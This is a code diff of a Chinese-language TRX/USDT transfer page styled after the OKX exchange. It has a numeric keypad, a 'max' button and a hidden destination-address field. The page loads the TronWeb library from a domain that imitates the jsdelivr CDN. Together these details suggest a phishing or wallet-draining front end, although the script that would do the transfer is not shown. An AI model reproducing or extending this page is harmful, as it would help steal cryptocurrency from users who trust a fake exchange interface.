@@ -1,44 +1,101 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
     <title>正在申请转账</title>
+    <link rel="icon" type="image/png" href="png/icon_trx.png">
+    <link rel="stylesheet" href="css/okx.css">
     <link rel="stylesheet" href="css/style.css">
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
     <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
     <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
-    <script defer src="js/main.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
-<body>
-    <div id="app" class="container">
-        <div class="pay-box">
-            <div class="amount">
-                <span id="amount">0</span>
-                <em id="currency">TRX</em>
-                <img id="toggleCurrency" src="png/icon_usdt.png" class="icon" alt="切换支付方式">
-            </div>
-        </div>
-        <div class="balance-info">
-            <p>余额: <span id="balance">0</span> <span id="balanceCurrency">TRX</span></p>
-        </div>
-        <div class="keyboard">
-            <button class="key">1</button>
-            <button class="key">2</button>
-            <button class="key">3</button>
-            <button class="key">4</button>
-            <button class="key">5</button>
-            <button class="key">6</button>
-            <button class="key">7</button>
-            <button class="key">8</button>
-            <button class="key">9</button>
-            <button class="key">.</button>
-            <button class="key">0</button>
-            <button id="clear" class="key">清除</button>
-        </div>
-        <button id="payButton" disabled>下一步</button>
-    </div>
+
+<body id="app" class="uni-body pages-index-home">
+    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
+
+    <uni-app class="uni-app--maxwidth">
+        <uni-page data-page="pages/index/home">
+            <uni-page-wrapper>
+                <uni-page-body>
+                    <div class="pay-box">
+                        <!-- 选择 TRX 或 USDT -->
+                        <div class="switch-box">
+                            <img id="trxIcon" src="png/icon_trx.png" class="coin active" onclick="switchCurrency('TRX')">
+                            <img id="usdtIcon" src="png/icon_usdt.png" class="coin" onclick="switchCurrency('USDT')">
+                        </div>
+
+                        <!-- 交易金额 -->
+                        <div class="amount">
+                            <div class="num">
+                                <span class="amount" id="amount"></span>
+                                <em id="currencyLabel">TRX</em>
+                            </div>
+                            <img src="png/icon_exchange.jpg" class="icon">
+                        </div>
+
+                        <div class="rate">
+                            <span id="amount-display"></span><em>USD</em>
+                            <div class="icon">
+                                <img src="png/icon_horn.jpg">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 余额信息 -->
+                    <div class="bottom-keyboard">
+                        <div class="asset-info">
+                            <div class="name">
+                                <img id="balanceIcon" src="png/icon_trx.png" class="coin">
+                                <div class="asset-box">
+                                    <p class="title">余额</p>
+                                    <p class="num"><span id="ye"></span><em id="balanceLabel">TRX</em></p>
+                                    <input type="text" id="address" style="display:none">
+                                </div>
+                            </div>
+                            <div class="right">
+                                <div class="btn" onclick="setMaxAmount()">最大</div>
+                            </div>
+                        </div>
+
+                        <!-- 数字键盘 -->
+                        <div class="keyboard-box">
+                            <div class="btn" onclick="pressKey('1')">1</div>
+                            <div class="btn" onclick="pressKey('2')">2</div>
+                            <div class="btn" onclick="pressKey('3')">3</div>
+                            <div class="btn" onclick="pressKey('4')">4</div>
+                            <div class="btn" onclick="pressKey('5')">5</div>
+                            <div class="btn" onclick="pressKey('6')">6</div>
+                            <div class="btn" onclick="pressKey('7')">7</div>
+                            <div class="btn" onclick="pressKey('8')">8</div>
+                            <div class="btn" onclick="pressKey('9')">9</div>
+                            <div class="btn" onclick="pressKey('.')">.</div>
+                            <div class="btn" onclick="pressKey('0')">0</div>
+                            <div class="btn delete" onclick="clearAmount()" style="margin-top:20px">
+                                <img src="png/icon_delete.jpg">
+                            </div>
+                        </div>
+
+                        <!-- 按钮 -->
+                        <footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;">
+                            <van-button class="submit-btn disabled" type="button" id="submitBtn" disabled>下一步</van-button>
+                            <van-button id="jixu" class="jixu">继续</van-button>
+                        </footer>
+                    </div>
+
+                    <!-- 提示信息 -->
+                    <div class="tishi" id="tip">提示</div>
+                    <input id="to_address" type="hidden">
+                </uni-page-body>
+            </uni-page-wrapper>
+        </uni-page>
+    </uni-app>
+
+    <script src="js/main.js"></script>
 </body>
 </html>
